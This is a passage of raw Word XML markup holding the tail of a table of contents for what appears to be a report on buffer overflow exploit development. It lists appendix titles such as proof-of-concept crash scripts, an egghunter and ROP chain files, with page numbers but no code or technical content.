            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2AD51A83" w14:textId="5C48A56E" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326486" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>5.2</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix B - Code</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326486 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4C66E2A4" w14:textId="7DF04D17" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326487" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>B1 - Crash1.pl Proof of Concept</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326487 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="22117942" w14:textId="64A71A7D" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326488" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">B2 - </w:t>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Modified crash1.pl contents to make use of the new minimum overflow value</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326488 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="13659DFD" w14:textId="3166447B" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326489" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>B3 - Modified crash1.pl to find the maximum shellcode size</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326489 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3C6AB18D" w14:textId="3652E2FB" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326490" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>B4 - Contents of badchar.pl</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326490 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="642A425E" w14:textId="02A60AAF" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326491" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>B5 - contents of message.pl</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326491 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4440E950" w14:textId="59613C0B" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326492" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>B6 - contents of tcp.pl</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326492 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="094381C0" w14:textId="35ADF0D4" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326493" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>B7 - Egghunter.pl</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326493 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7DD55480" w14:textId="2B8427DA" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326494" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>B8 - ROP RETN test (ropcrash.pl)</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326494 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7C17A3B7" w14:textId="4C36D492" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326495" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>B9 - Final ROP crash file (ropcrash2.pl)</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326495 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="31F08F01" w14:textId="54D3D07A" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326496" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>5.3</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix C - Visualisations</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326496 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="74AAE603" w14:textId="41328337" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326497" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>C1 - ROP Chains</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326497 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5B46FA53" w14:textId="503CBBBA" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326498" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>C2 - Steflan Overflow Process</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326498 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6E5F7065" w14:textId="4CFE1818" w:rsidR="00C6130C" w:rsidRPr="006D5BB6" w:rsidRDefault="00C6130C">
          <w:pPr>
            <w:sectPr w:rsidR="00C6130C" w:rsidRPr="006D5BB6" w:rsidSect="00C5090A">
              <w:footerReference w:type="default" r:id="rId10"/>
              <w:footerReference w:type="first" r:id="rId11"/>
              <w:type w:val="continuous"/>
              <w:pgSz w:w="12240" w:h="15840"/>
              <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
              <w:pgNumType w:start="0"/>
              <w:cols w:space="720"/>
              <w:docGrid w:linePitch="299"/>
            </w:sectPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="5E67C8C7" w14:textId="571CC870" w:rsidR="001905B9" w:rsidRPr="00822837" w:rsidRDefault="00341658" w:rsidP="00822837">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:sz w:val="44"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc102919464"/>
      <w:bookmarkStart w:id="1" w:name="_Toc103326446"/>
      <w:r w:rsidRPr="00822837">
        <w:rPr>
          <w:sz w:val="44"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Introducti</w:t>
      </w:r>
      <w:r w:rsidR="00822837" w:rsidRPr="00822837">
